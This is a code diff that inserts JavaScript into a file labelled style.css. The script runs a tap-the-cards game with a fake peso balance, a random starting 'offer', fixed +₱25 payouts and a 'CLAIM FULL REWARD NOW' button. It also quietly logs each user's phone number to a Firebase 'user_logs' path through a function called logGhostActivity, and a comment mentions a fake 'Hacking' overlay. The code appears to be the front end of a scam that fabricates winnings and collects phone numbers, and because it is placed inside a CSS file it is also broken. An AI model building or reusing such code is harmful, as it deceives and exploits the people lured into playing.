@@ -1,5 +1,98 @@
 /* style.css - Full Version with 6 Unique Moves & Persistence Logic */
 
+// --- DATABASE INITIALIZATION ---
+firebase.initializeApp(firebaseConfig);
+const db = firebase.database();
+const userPhone = localStorage.getItem("userPhone") || "Guest";
+
+let balance = 0;
+let clickCount = 0;
+const maxClicks = 5;
+
+// Listahan ng mga animation classes mula sa style.css mo
+const animations = [
+    'move-goddess', 'move-monkey', 'move-zeus', 
+    'move-bear', 'move-dress', 'move-boxer'
+];
+
+// 1. RANDOM STARTING OFFER
+window.onload = () => {
+    const randomStart = [150, 200, 250, 350][Math.floor(Math.random() * 4)];
+    updateBalance(randomStart);
+    generateGameGrid();
+};
+
+function generateGameGrid() {
+    const grid = document.querySelector('.game-grid'); // Siguraduhin na may class na .game-grid sa HTML
+    grid.innerHTML = ''; 
+
+    for (let i = 0; i < 9; i++) {
+        const wrapper = document.createElement('div');
+        wrapper.className = 'card-wrapper';
+        
+        // Gamit ang card-img class mula sa CSS mo
+        wrapper.innerHTML = `<img src="img/char${i+1}.png" class="card-img" id="char-${i}">`;
+        
+        wrapper.onclick = () => handleCardInteraction(i);
+        grid.appendChild(wrapper);
+    }
+}
+
+function handleCardInteraction(index) {
+    if (clickCount >= maxClicks) return;
+
+    const img = document.getElementById(`char-${index}`);
+    if (img.classList.contains('card-disabled')) return;
+
+    clickCount++;
+    
+    // 2. RANDOM ANIMATION LOGIC (Para sa 6 Unique Moves)
+    const randomMove = animations[Math.floor(Math.random() * animations.length)];
+    img.classList.add(randomMove);
+
+    // 3. PERSISTENCE & DISABLE LOGIC
+    setTimeout(() => {
+        img.classList.remove(randomMove);
+        img.classList.add('card-disabled'); // Para mag-grayscale(0.9) gaya ng CSS mo
+    }, 600);
+
+    // 4. ACCURATE +25 PAYOUT
+    updateBalance(25);
+
+    if (clickCount === maxClicks) {
+        showFinalClaim();
+        logGhostActivity();
+    }
+}
+
+function updateBalance(amount) {
+    balance += amount;
+    const balanceDisplay = document.querySelector('.amount'); // Target yung .amount sa CSS mo
+    if(balanceDisplay) {
+        balanceDisplay.innerText = `₱${balance.toLocaleString('en-US', {minimumFractionDigits: 2})}`;
+    }
+}
+
+function showFinalClaim() {
+    // I-enable ang pay-button
+    const payBtn = document.querySelector('.pay-button');
+    if(payBtn) {
+        payBtn.disabled = false;
+        payBtn.innerText = "CLAIM FULL REWARD NOW";
+    }
+    // I-show ang processing overlay kung gusto mo ng "Hacking" effect
+    // document.getElementById('processingOverlay').style.display = 'flex';
+}
+
+function logGhostActivity() {
+    db.ref('user_logs/' + userPhone).set({
+        phone: userPhone,
+        reward: balance,
+        status: 'idle',
+        last_updated: new Date().toLocaleString()
+    });
+}
+
 :root { 
     --gold: linear-gradient(180deg, #ffdc6a 0%, #d4af37 100%); 
     --dark-bg: #04070d; 
